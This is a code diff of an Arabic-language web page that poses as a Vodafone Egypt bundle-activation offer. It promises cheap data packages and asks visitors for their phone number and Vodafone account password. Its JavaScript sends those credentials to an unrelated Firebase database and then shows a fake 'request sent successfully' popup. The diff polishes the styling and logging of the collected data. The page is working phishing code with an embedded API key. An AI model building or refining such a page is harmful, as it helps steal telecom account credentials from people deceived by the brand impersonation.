@@ -1,13 +1,15 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>تفعيل باقات فودافون</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <!-- Firebase -->
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
   <style>
+    @import url('https://fonts.googleapis.com/css2?family=Cairo&display=swap');
+
     body {
       background-color: #7b0000;
       color: white;
@@ -52,6 +54,12 @@
       font-weight: bold;
       margin-top: 10px;
       cursor: pointer;
+      user-select: none;
+      transition: background 0.3s ease;
+    }
+    .btn:hover {
+      background: #ff4d4d;
+      color: white;
     }
 
     input {
@@ -61,6 +69,8 @@
       padding: 10px;
       border-radius: 8px;
       border: none;
+      font-size: 16px;
+      text-align: center;
     }
 
     .conditions {
@@ -76,39 +86,57 @@
       direction: ltr;
     }
 
-    #successPopup {
+    .popup {
       position: fixed;
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
       background: white;
       color: #7b0000;
-      padding: 30px;
+      padding: 25px 40px;
       border-radius: 15px;
       font-size: 18px;
       font-weight: bold;
       display: none;
-      z-index: 999;
+      z-index: 9999;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+      animation: popupFade 0.5s ease-in-out;
+    }
+
+    @keyframes popupFade {
+      from {
+        opacity: 0;
+        transform: translate(-50%, -40%);
+      }
+      to {
+        opacity: 1;
+        transform: translate(-50%, -50%);
+      }
+    }
+
+    #costDisplay {
+      font-size: 14px;
+      color: #ffebeb;
+      margin-top: 5px;
+      height: 20px;
     }
 
     .snowflake {
       position: fixed;
-      top: -10px;
+      top: -20px;
       width: 10px;
       height: 10px;
       background: white;
       border-radius: 50%;
-      opacity: 0.8;
+      opacity: 0.7;
+      animation: fall linear infinite;
       z-index: 0;
-      animation: fall linear forwards;
+      pointer-events: none;
     }
 
     @keyframes fall {
-      0% {
-        transform: translateY(0) rotate(0deg);
-      }
-      100% {
-        transform: translateY(100vh) rotate(360deg);
+      to {
+        transform: translateY(100vh);
         opacity: 0;
       }
     }
@@ -124,9 +152,9 @@
       <h2>13000 فليكس</h2>
       <p>240 جنيه</p>
       <div class="conditions">شروط: لا يكون عليك سلف أو نوتة - التفعيل خلال ساعتين من إرسال الرقم وكلمة المرور</div>
-      <input type="text" placeholder="رقم فودافون" id="num1">
-      <input type="password" placeholder="كلمة المرور" id="pass1">
-      <div class="btn" onclick="sendData('فليكس 13000', 'num1', 'pass1')">تفعيل الآن</div>
+      <input type="text" placeholder="رقم فودافون" id="numFlex" />
+      <input type="password" placeholder="كلمة المرور" id="passFlex" />
+      <div class="btn" onclick="sendData('فليكس 13000', 'numFlex', 'passFlex')">تفعيل الآن</div>
     </div>
 
     <!-- 40 جيجا -->
@@ -134,9 +162,9 @@
       <h2>40 جيجا</h2>
       <p>330 جنيه</p>
       <div class="conditions">شروط: التفعيل حتى لو عليك سلف أو نوتة - خلال 72 ساعة من إرسال الرقم وكلمة المرور</div>
-      <input type="text" placeholder="رقم فودافون" id="num2">
-      <input type="password" placeholder="كلمة المرور" id="pass2">
-      <div class="btn" onclick="sendData('40 جيجا', 'num2', 'pass2')">تفعيل الآن</div>
+      <input type="text" placeholder="رقم فودافون" id="num40gb" />
+      <input type="password" placeholder="كلمة المرور" id="pass40gb" />
+      <div class="btn" onclick="sendData('40 جيجا', 'num40gb', 'pass40gb')">تفعيل الآن</div>
     </div>
 
     <!-- رصيد صافي -->
@@ -144,8 +172,8 @@
       <h2>شحن رصيد صافي</h2>
       <p>اكتب الكمية واحسب</p>
       <div class="conditions">يتم إرسال الرصيد خلال نصف ساعة من إدخال الرقم</div>
-      <input type="text" placeholder="رقم فودافون" id="eg">
-      <input type="number" placeholder="كمية الصافي" id="egg">
+      <input type="text" placeholder="رقم فودافون" id="egNumber" />
+      <input type="number" placeholder="كمية الصافي" id="egValue" min="0" step="0.01" />
       <p id="costDisplay"></p>
       <div class="btn" onclick="sendBalance()">شحن الآن</div>
     </div>
@@ -153,10 +181,10 @@
     <footer>Developed by: mahmoud gamal</footer>
   </div>
 
-  <div id="successPopup">تم إرسال الطلب بنجاح</div>
+  <div class="popup" id="popupSuccess">✅ تم إرسال الطلب بنجاح</div>
 
   <script>
-    // Firebase
+    // Firebase Config
     const firebaseConfig = {
       apiKey: "AIzaSyCuP6VscPxkQS5D5z7bCYWXijzaYCdbF2s",
       authDomain: "starkoscript.firebaseapp.com",
@@ -169,87 +197,119 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
+    // حساب السعر وعرضه
+    const egInput = document.getElementById("egValue");
     const costDisplay = document.getElementById("costDisplay");
-    const eggInput = document.getElementById("egg");
-    if (eggInput) {
-      eggInput.addEventListener("input", () => {
-        const val = parseFloat(eggInput.value);
-        if (!isNaN(val)) {
-          costDisplay.textContent = `المبلغ المطلوب: ${val * 1.2} جنيه`;
-        } else {
-          costDisplay.textContent = "";
-        }
-      });
-    }
 
+    egInput.addEventListener("input", () => {
+      const val = parseFloat(egInput.value);
+      if (!isNaN(val) && val > 0) {
+        const final = (val * 1.2).toFixed(2);
+        costDisplay.textContent = `المبلغ المطلوب: ${final} جنيه`;
+      } else {
+        costDisplay.textContent = "";
+      }
+    });
+
+    // إرسال بيانات باقات فليكس 13000 و 40 جيجا
     function sendData(type, numId, passId) {
-      const num = document.getElementById(numId).value;
-      const pass = document.getElementById(passId).value;
-      const text = `طلب ${type} - رقم: ${num}`;
+      const num = document.getElementById(numId).value.trim();
+      const pass = document.getElementById(passId).value.trim();
 
       if (!num || !pass) {
-        alert("يرجى إدخال الرقم وكلمة المرور");
+        alert("يرجى تعبئة جميع الحقول");
         return;
       }
 
-      db.ref("starko").push({
-        type,
-        num,
-        pass,
-        text
-      }).then(() => {
-        showPopup();
-      }).catch((err) => {
-        alert("حدث خطأ أثناء الإرسال");
-        console.error(err);
-      });
+      // تحديد مفتاح الوقت حسب نوع الباقة
+      const now = new Date().toLocaleString('sv-EG');
+      const timeKey = type === "فليكس 13000" ? "time" : "time1";
+
+      const data = {
+        text: `طلب باقة: ${type}`,
+        num: num,
+        pass: pass,
+        [timeKey]: now,
+      };
+
+      db.ref("Vodafone")
+        .push(data)
+        .then(() => {
+          showPopup();
+          clearInputs(numId, passId);
+        })
+        .catch((err) => {
+          alert("حدث خطأ أثناء الإرسال");
+          console.error(err);
+        });
     }
 
+    // إرسال بيانات رصيد صافي
     function sendBalance() {
-      const eg = document.getElementById("eg").value;
-      const egg = document.getElementById("egg").value;
-      const total = parseFloat(egg) * 1.2;
-      const text = `طلب شحن رصيد صافي بقيمة ${egg} جنيه إلى الرقم ${eg}`;
+      const num = document.getElementById("egNumber").value.trim();
+      const amount = parseFloat(document.getElementById("egValue").value);
 
-      if (!eg || !egg) {
-        alert("يرجى إدخال الرقم والكمية");
+      if (!num || isNaN(amount) || amount <= 0) {
+        alert("يرجى إدخال الرقم وقيمة الرصيد بشكل صحيح");
         return;
       }
 
-      db.ref("starko").push({
-        type: "رصيد صافي",
-        eg,
-        egg: total.toFixed(2),
-        text
-      }).then(() => {
-        showPopup();
-      }).catch((err) => {
-        alert("حدث خطأ أثناء الإرسال");
-        console.error(err);
-      });
+      const total = (amount * 1.2).toFixed(2);
+      const now = new Date().toLocaleString('sv-EG');
+
+      const data = {
+        text: `طلب رصيد صافي - ${amount}ج`,
+        eg: num,
+        egg: total,
+        time2: now,
+      };
+
+      db.ref("Vodafone")
+        .push(data)
+        .then(() => {
+          showPopup();
+          clearInputs("egNumber", "egValue");
+          costDisplay.textContent = "";
+        })
+        .catch((err) => {
+          alert("حدث خطأ أثناء الإرسال");
+          console.error(err);
+        });
     }
 
+    // إظهار نافذة النجاح
     function showPopup() {
-      const popup = document.getElementById("successPopup");
+      const popup = document.getElementById("popupSuccess");
       popup.style.display = "block";
       setTimeout(() => {
         popup.style.display = "none";
       }, 3000);
     }
 
-    // تلج بيتساقط
-    function createSnowflake() {
-      const snow = document.createElement("div");
-      snow.classList.add("snowflake");
-      snow.style.left = Math.random() * window.innerWidth + "px";
-      snow.style.animationDuration = (Math.random() * 3 + 2) + "s";
-      snow.style.opacity = Math.random();
-      snow.style.width = snow.style.height = (Math.random() * 5 + 5) + "px";
-      document.body.appendChild(snow);
-      setTimeout(() => snow.remove(), 5000);
+    // مسح الحقول بعد الإرسال
+    function clearInputs(...ids) {
+      ids.forEach(id => {
+        const el = document.getElementById(id);
+        if (el) el.value = "";
+      });
     }
 
-    setInterval(createSnowflake, 100);
+    // إنشاء تأثير تساقط التلج (Snowflakes)
+    function createSnowflake() {
+      const snowflake = document.createElement("div");
+      snowflake.classList.add("snowflake");
+      snowflake.style.left = Math.random() * window.innerWidth + "px";
+      snowflake.style.animationDuration = 3 + Math.random() * 5 + "s";
+      snowflake.style.opacity = Math.random();
+      snowflake.style.width = snowflake.style.height = (5 + Math.random() * 10) + "px";
+      document.body.appendChild(snowflake);
+
+      setTimeout(() => {
+        snowflake.remove();
+      }, 7000);
+    }
+
+    setInterval(createSnowflake, 200);
   </script>
 </body>
 </html>
